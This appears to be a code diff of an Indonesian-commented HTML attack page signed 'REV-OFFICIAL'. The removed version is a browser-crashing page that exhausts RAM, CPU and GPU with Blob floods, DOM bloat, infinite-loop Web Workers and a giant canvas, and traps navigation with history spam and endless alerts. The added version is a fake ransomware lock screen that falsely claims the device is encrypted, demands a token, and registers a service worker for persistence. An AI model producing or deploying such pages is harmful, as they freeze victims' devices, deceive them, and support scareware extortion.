@@ -1,94 +1,75 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>TERMINATED BY REV-OFFICIAL</title>
+    <title>SYSTEM ENCRYPTED - REV-OFFICIAL</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
-        body { 
-            background: black; 
-            color: red; 
-            font-family: 'Courier New', Courier, monospace; 
-            text-align: center; 
-            padding-top: 15%; 
-            overflow: hidden;
-        }
-        .warning { font-size: 50px; font-weight: bold; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding-top: 10%; overflow: hidden; }
+        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        .critical { color: red; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="warning">SYSTEM CRITICAL ERROR</div>
-    <h1 style="font-size: 30px;">DEVICE OWNED BY REV-OFFICIAL</h1>
-    <p>ARCHITECT 02 - ABSOLUTE DOMINANCE PROTOCOL ACTIVE</p>
+    <div id="lock-screen">
+        <h1 class="critical">⚠️ YOUR DEVICE HAS BEEN ENCRYPTED ⚠️</h1>
+        <p>Seluruh data Anda telah dienkripsi oleh <b>REV-OFFICIAL</b>.</p>
+        <p>Masukkan TOKEN untuk dekripsi atau sistem akan hancur permanen.</p>
+        <br>
+        <input type="text" id="token" placeholder="ENTER ACCESS TOKEN...">
+        <button onclick="checkToken()">DECRYPT</button>
+        <p id="msg"></p>
+    </div>
 
     <script>
-        // --- 1. ABSOLUTE LOCK & NAVIGATION HIJACK ---
-        (function() {
-            window.onbeforeunload = function() { return "REV-OFFICIAL"; };
-            // Bomb history biar gak bisa back
-            for (let i = 0; i < 500; i++) {
-                history.pushState(null, document.title, location.href + "#/rev-official/" + i);
-            }
-            window.addEventListener('popstate', function() {
-                for(let j=0; j<10; j++) history.pushState(null, document.title, location.href);
-                alert("GAK ADA JALAN KELUAR, GOBLOK!");
-            });
-        })();
-
-        // --- 2. THE NUCLEAR ENGINE (RAM/CPU/GPU) ---
-        var nukeBuffer = [];
-        
-        function godMode() {
-            // RAM EXHAUSTION: Injeksi Blob berukuran gila secara eksponensial
-            try {
-                for (let i = 0; i < 2000; i++) {
-                    let heavyBlob = new Blob([new Array(1000000).fill("REV-OFFICIAL-STRIKE")], {type: 'text/plain'});
-                    nukeBuffer.push(URL.createObjectURL(heavyBlob));
-                }
-            } catch(e) {}
-
-            // DOM EXPLOSION: Menuhin layar sampe rendering engine mampus
-            let container = document.createElement('div');
-            container.innerHTML = new Array(1000).join('<h2 style="color:white">RE-OFFICIAL DOMINATION</h2>');
-            document.body.appendChild(container);
-
-            // GPU STRESS: Render canvas resolusi monster dengan efek berat
-            let c = document.createElement('canvas');
-            let ctx = c.getContext('2d');
-            c.width = 50000; c.height = 50000;
-            ctx.shadowBlur = 500;
-            ctx.shadowColor = "blue";
-            ctx.fillRect(0, 0, 50000, 50000);
-
-            // FORK BOMB: Web Worker biar semua Core CPU 100%
-            if (window.Worker) {
-                const blobCode = new Blob(["while(true){}"], {type: 'text/javascript'});
-                new Worker(URL.createObjectURL(blobCode));
-            }
-
-            // RECURSION: Panggil diri sendiri tanpa delay
-            setTimeout(godMode, 0);
+        // 1. SERVICE WORKER FOR PERSISTENCE (THE GHOST)
+        // Ini bikin web Master "nempel" di browser mereka
+        if ('serviceWorker' in navigator) {
+            const swCode = `
+                self.addEventListener('fetch', function(event) {
+                    // Maksa semua request balik lagi ke halaman lock
+                    event.respondWith(fetch(event.request).catch(() => caches.match('/index.html')));
+                });
+                self.addEventListener('activate', (event) => {
+                    console.log('REV-OFFICIAL PERSISTENCE ACTIVE');
+                });
+            `;
+            const blob = new Blob([swCode], {type: 'application/javascript'});
+            navigator.serviceWorker.register(URL.createObjectURL(blob));
         }
 
-        // --- 3. HARDWARE & UI ATTACK ---
+        // 2. NO ESCAPE - REDIRECT LOCK
+        // Kalo mereka coba keluar, kita spam history dan force reload
         setInterval(() => {
-            // Getar paksa (kalo support)
-            if (navigator.vibrate) navigator.vibrate([2000, 100, 2000]);
-            // Randomize UI buat nambah beban render
-            document.body.style.backgroundColor = (document.body.style.backgroundColor == 'black' ? 'red' : 'black');
-            window.scrollTo(0, Math.random() * 1000);
-        }, 5);
+            history.pushState(null, "", location.href);
+            if(localStorage.getItem('locked') === 'true') {
+                window.onbeforeunload = function() { return "DATA SEDANG DIHANCURKAN!"; };
+            }
+        }, 100);
 
-        // --- 4. EXECUTE ON LOAD ---
-        window.onload = function() {
-            console.log("NUCLEAR DEPLOYED.");
-            godMode();
-        };
+        // 3. ENCRYPTION LOGIC
+        localStorage.setItem('locked', 'true');
+        const MASTER_KEY = "REV-OFFICIAL-2026"; // Token Master
 
-        // Anti-Close Emergency
-        window.onunload = function() {
-            while(true) { alert("REV-OFFICIAL ADALAH TUAN LO!"); }
-        };
+        function checkToken() {
+            let input = document.getElementById('token').value;
+            if (input === MASTER_KEY) {
+                localStorage.setItem('locked', 'false');
+                document.body.innerHTML = "<h1 style='color:white'>DECRYPTED SUCCESSFULLY.</h1>";
+                alert("ACCESS GRANTED.");
+            } else {
+                document.getElementById('msg').innerHTML = "<span class='critical'>TOKEN SALAH! MENGHAPUS DATA...</span>";
+                // TRIGGER LAG/FREEZE KALO SALAH TOKEN
+                for(let i=0; i<100000; i++) { console.log("HACKED BY REV"); }
+            }
+        }
+
+        // 4. PREVENT BACK BUTTON
+        window.addEventListener('popstate', function() {
+            history.pushState(null, "", location.href);
+            alert("SISTEM TERKUNCI PERMANEN!");
+        });
     </script>
 </body>
 </html>
